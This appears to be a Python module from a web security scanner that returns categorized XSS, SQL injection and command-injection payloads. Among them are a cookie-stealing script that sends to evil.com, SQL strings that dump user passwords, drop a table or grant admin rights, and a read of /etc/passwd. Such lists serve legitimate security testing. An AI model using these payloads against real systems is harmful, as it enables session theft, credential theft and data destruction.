"""
Payload Generator
Central source of payloads for XSS, SQL Injection, and Command Injection.
"""

from typing import Dict, List


def get_xss_payloads() -> Dict[str, List[str]]:
    """
    Returns categorized XSS payloads
    """
    return {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "<img src=x onerror=confirm(1)>"

        ],
        "event_handlers": [
            "<body onload=alert(1)>",
            "<div onclick=alert(1)>Click me</div>",
            "<a href='#' onmouseover=alert(1)>Hover</a>"
        ],
        "malformed_tags": [
            "<scr<script>ipt>alert(1)</script>",
            "<scr<script>alert(1)</script>",
            "<<script>alert(1)</script>"
        ],
        "dom": [
            "javascript:alert(1)",
            "<input onfocus='location.hash=alert(1)'>",
            "<a href='javascript:alert(1)'>Click</a>",
            "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
        ]
    }


def get_sqli_payloads() -> Dict[str, List[str]]:
    """
    Returns categorized SQLi payloads
    """
    return {
        "union": [
            "' UNION SELECT null, version() -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION SELECT 1, 2, 3 -- ",
            "' UNION ALL SELECT NULL, NULL -- "
        ],
        "error_based": [
            "' AND updatexml(1,concat(0x7e,user(),0x7e),1) -- ",
            "' AND 1=CAST((CHR(113)||CHR(120)||CHR(113)||CHR(107)||CHR(113)) AS NUMERIC) -- ",
            "' OR 1=1 LIMIT 1 OFFSET 1 -- "
        ],
        "boolean_based": [
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "' OR 'a'='a' -- ",
            "' OR 'x'='y' -- "
        ],
        "stacked": [
            "'; DROP TABLE users; -- ",
            "1; UPDATE users SET role='admin' WHERE username='john'; --"
        ],
        "blind": [
            "' AND (SELECT SUBSTRING(@@version,1,1))='5' -- ",
            "' AND SLEEP(5) -- ",
            "' OR 1=1 WAITFOR DELAY '00:00:05' -- ",
            "' AND IF(1=1, SLEEP(5), 0) -- "
        ]
    }


def get_cmdi_payloads() -> Dict[str, List[str]]:
    """
    Returns categorized Command Injection payloads
    """
    return {
        "basic": [
            "id; whoami",
            "ls -la; pwd",
            "cat /etc/passwd"
        ],
        "injection_variants": [
            "`whoami`",
            "$(id)",
            "'; uname -a; #",
            "& echo hello",
            "| whoami"
        ],
        "environment_tricks": [
            "ping $HOSTNAME",
            "echo $USER",
            "ls $PWD"
        ]
    }
